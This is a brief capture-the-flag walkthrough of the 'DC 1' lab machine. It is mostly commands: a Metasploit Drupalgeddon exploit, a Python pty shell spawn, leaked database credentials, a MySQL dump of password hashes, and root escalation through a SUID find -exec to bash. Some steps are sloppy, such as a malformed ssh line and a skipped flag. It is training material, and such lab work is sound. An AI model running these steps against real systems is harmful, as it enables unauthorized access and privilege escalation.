# DC 1 Walkthrough

### Exploiting Drupalgeddon

```sh
msfconsole -q
search Drupalgeddon
use 0
set RHOSTS <target-ip>
exploit
#shell
python -c "import pty; pty.spawn('/bin/bash')"
```

### Retrieving the First Flag

```sh
cat flag1.txt
```

**Flag1**
> Every good CMS needs a config file—and so do you.

### Finding Database Credentials

```php
array (
 'database' => 'drupaldb',
 'username' => 'dbuser',
 'password' => 'R0ck3t',
 'host' => 'localhost',
 'port' => '3306',
 'driver' => 'mysql',
 'prefix' => '',
)
```

**Flag 2**
> Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access).
> What can you do with these credentials?

### Accessing MySQL

```sh
mysql -u dbuser -pR0ck3t -h localhost
SELECT name, pass FROM users;
```

```
admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
```


```sh
ssh ip@fred
cd /home
cat flag4
```

**flag4**
> Can you use this same method to find or access the flag in root?
> Probably. But perhaps it's not that easy. Or maybe it is?


```sh
find / -perm -u=s 2>/dev/null
find /dev -name null -exec /bin/bash \;
## Accessing the Root Directory
cd /root
cat thefinalflag.txt
```
## Final Flag

> Congratulations!
> Well done!
> Hopefully you've enjoyed this and learned some new skills.
> You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7
---
